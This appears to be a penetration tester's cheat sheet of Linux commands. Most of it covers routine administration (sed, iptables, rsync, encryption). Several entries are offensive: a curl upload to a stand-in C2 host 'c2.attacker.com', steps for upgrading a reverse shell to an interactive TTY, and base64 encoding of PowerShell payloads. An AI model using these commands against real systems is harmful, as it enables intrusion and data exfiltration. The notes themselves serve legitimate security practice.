# Useful commands in Linux

## comm

* Substitute if not satisfied with diff[^1]
```bash
comm <-123> file1 file2 2>/dev/null
```

## read
* Used for pausing mid loop and possibly asking for user input
* Usually seen with `<Press any key to continue>`
```bash
# Command below will pause the bash script till <space> is pressed
read -s -d ' '
```

## sed
### Basic Sed Commands
* Replace 'newlines' or `\n` with sed
```bash
cat targets.txt| sed -z "s/\n/\/\nhttps:\/\//g" > targets_https.txt
cat naabu_output.txt| sed -z "s/\n/\/\nhttps:\/\//g" > naabu_all_ports_withoutIPs_https.txt
```
* Remove 1st and last character
```bash
cat lines.txt|sed "s/^.//;s/.$//"
```
### Recursive sed
* In case you want to change values in a lot of text files
* One of the many ways [^2]
* Change the 4 values between `< >`
```bash
find <DIRECTORY_TO_FIND_FROM> \( -type d -name <DIRECTORY_YOU_WANT_TO_AVOID> -prune \) -o -type f -print0 | xargs -0 sed -i 's/<ORIGINAL_TEXT>/<NEW_TEXT>/g'
```

## shred
* Delete files
* This cannot easily although still possible to be recovered
```bash
shred -u <file_to_delete>
```

## testdisk
* Recover accidentally deleted file (i.e. using `#!bash rm`)[^3]
```bash
sudo testdisk
# View step 8 of the source. Select the option "Undelete" might not be there, choose "List"
```

## ps (Wide output)
* Everybody knows `#!bash ps aux`
* this however generates a limited output
* to show the whole command, do: (add or lessen 'w' if needed)
```bash
ps auxwww
```

## grep
* Asides from the common uses of grep
* to filter out all lines ending in a specific character
    * Use case: filtering out exported URLs which has duplicates where one URL ends in '/' and one without
```bash
echo "aaaaaaa.rar\nbbbbbbbbrar" > /tmp/temp.txt

$ cat /tmp/temp.txt | grep 'rar$'
aaaaaaa.rar
bbbbbbbbrar

#Add '\b' for "word-boundary"
$ cat /tmp/temp.txt | grep '\brar$'
aaaaaaa.rar

#Just add '-v' after 'grep' to "select non-matching lines" / inverse
```

## RDP
* Connecting to a Windows host via RDP
```
 xfreerdp +nego +sec-rdp +sec-tls +sec-nla /v:<hostname/IP>  /d: /u:<username> /p:<password> /size:90%
```
* Compressed RDP for low bandwidth or slow RDP connections
```
# MTU config first
ifconfig mtu 1200 <interface>
ifconfig mtu 1200 tun0

# rdesktop
rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u <USERNAME> -p <PASSWORD> 192.168.1.5
rdesktop -d <domain> -u <username> -p <password or '-' for prompt> -a 16 -P -z -E -T <TAG-WindowName> <RDPHOST_IP>
rdesktop -d company.local -u administrator -p P@ssw0rd -a 16 -P -z -E -T COMPANY-DC3 10.10.10.100
```

## iptables [^4][^5]
```
# View rules
sudo iptables -L --line-numbers

# Add rule
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT

# Drop from everybody else
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# Save rules
sudo /sbin/iptables–save

# Delete Rule
sudo iptables -D INPUT <line_num>

# Example:
# Only allow SSH connection from 192.168.1.0/24
sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP
```

## Mirror a website
```
wget --mirror --convert-links --adjust-extension --page-requisites --wait=1 -o wget-mirror.log --no-parent https://example.org
```

## Upload files via Curl
* Combine with [Simple HTTP(s) Servers](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver)
```
curl -k --user 'root:toor' --upload-file file.zip https://127.0.0.1:8000/file.zip
curl -k --user 'root:haxorz' --upload-file file.zip https://c2.attacker.com:443/file.zip
```

## Upgrade Reverse shell to fully interactive TTY[^6]
* In reverse shell 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
<Ctrl-Z>
```
* In Attacker console
```bash
stty raw -echo
fg
```
* In reverse shell
```bash
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## Create a user
```bash
# Create a user
useradd user -U -s /bin/bash
# Create a sudo user
useradd user -G sudo -U -s /bin/bash
```

## Transfer files using nc (netcat)[^7]
* Basic
```bash
# Receiving
nc -l -p 9999 > received_file.txt
# Sending
nc 192.168.0.1 9999 < received_file.txt
```
* With compression
```bash
# Receiving
nc -l -p 9999 | xz -dc | tar xvf -
# Sending
tar cvf - . | xz -c | nc 192.168.0.1 9999
```

## Base64 encode
* Some use cases:
    * Encoding [Powershell one-liners](../Windows/Shells.html#one-liners)
```bash
iconv -f ASCII -t UTF-16LE powershell_payload.txt | base64 | tr -d "\n"
```
* Another way below but prioritize above
```bash
echo -n 'Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"' | iconv -f UTF8 -t UTF16LE | base64 -w 0
# Remove the % character at the end
```

## Rsync
* Similar to SCP but better overall especially long term[^8]
```bash
rsync -azP root@192.168.1.1:/home/some_directory ./
```

## Compressed RDP for low bandwidth
* Lower your MTU first
    ```bash
    ifconfig mtu 1200 <interface>
    ifconfig mtu 1200 tun0
    ```
* rdesktop
    ```bash
    rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u <USERNAME> -p <PASSWORD> 192.168.1.5
    rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u master -p masterlab 192.168.1.5
    
    rdesktop -a 16 -P -z -E -T <TAG-WindowName> -d <domain> -u <username> -p <password or '-' for prompt> 192.168.1.5
    rdesktop -a 16 -P -z -E -T COMPANY-DC3 -d company.local -u administrator -p P@ssw0rd 192.168.1.5
    ```

## Encrypting files
### zip[^8]
```bash
zip -e secure.tar.xz.zip notsecure.tar.xz -P someGoodPassword
unzip secure.tar.xz.zip
```
### tar & OpenSSL[^9][^10]
* Unreliable decryption (Have not yet figured out if it's due to different openssl versions or arch)
* This one requires an active tty, need to manually type passphrase
```bash
tar --xz -cvf - *  | openssl enc -e -aes256 -out secured.tar.gz
```
* Did not work in some instances, try on Debian
```bash
tar --xz -cvf - *  | openssl enc -e -aes256 -out secured.tar.gz -pass file:<( echo -n "someGoodPassword" )
```
* Decryption
```bash
openssl enc -d -aes256 -in secured.tar.gz | tar --xz -xv
```

## Generate random passwords
```bash
openssl rand 256 | sha256sum | cut -d " " -f1

SERVICE_PASSWORD=$(openssl rand 32 | sha256sum | cut -d' ' -f1)
echo $SERVICE_PASSWORD
```

## Go through filenames with spaces
* Basic[^11]
    ```bash
    find . -type f -name '*.*' -print0 | 
    while IFS= read -r -d '' file; do
        printf '%s\n' "$file"
    done
    ```
* Sample Use Case:
    * Export thunderbird inbox to get attachments and move all of the exported attachments into 1 folder for easy viewing/archiving
        * In Thunderbird: `ImportExportTools NG -> Export all messages in the folder - > as single text file (with attachments)`
        * Sample command:
            ```bash
            find ../Thunderbird_Export/ -type f -name '*.*' -print0 | while IFS= read -r -d '' file; do mv "$file" .;done
            ```

## List files and sort via date time
```
ls -t
```



[^1]: [Stack Overflow](https://stackoverflow.com/questions/3724786/how-to-diff-two-file-lists-and-ignoring-place-in-list)
[^2]: [StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)
[^3]: [It's FOSS](https://itsfoss.com/recover-deleted-files-linux/)
[^4]: [Fedora Project](https://docs.fedoraproject.org/en-US/quick-docs/how-to-edit-iptables-rules/)
[^5]: [Phoenixnap](https://phoenixnap.com/kb/iptables-tutorial-linux-firewall)
[^6]: [6c2e6e2e - Spawning interactive reverse shells with TTY](https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e)
[^7]: [Tutorials Technology - How to transfer files over the network using Netcat ](https://tutorials.technology/tutorials/How-to-transfer-files-over-the-network-using-Netcat.html)
[^8]: [StackOverflow - How zip file with encryption from bash script](https://stackoverflow.com/questions/52093920/how-zip-file-with-encryption-from-bash-script)
[^9]: [Tecmint - How to Encrypt and Decrypt Files and Directories Using Tar and OpenSSL](https://www.tecmint.com/encrypt-decrypt-files-tar-openssl-linux/)
[^10]: [StackOverflow - Securely passing password to openssl via stdin](https://stackoverflow.com/questions/6321353/securely-passing-password-to-openssl-via-stdin)
[^11]: [AskUbuntu - Filenames with spaces breaking for loop, find command](https://askubuntu.com/a/343753)
[^12]: [StackOverflow - Understanding a sed command: sed 's/\s\s*/ /g'](https://unix.stackexchange.com/questions/583882/understanding-a-sed-command-sed-s-s-s-g)
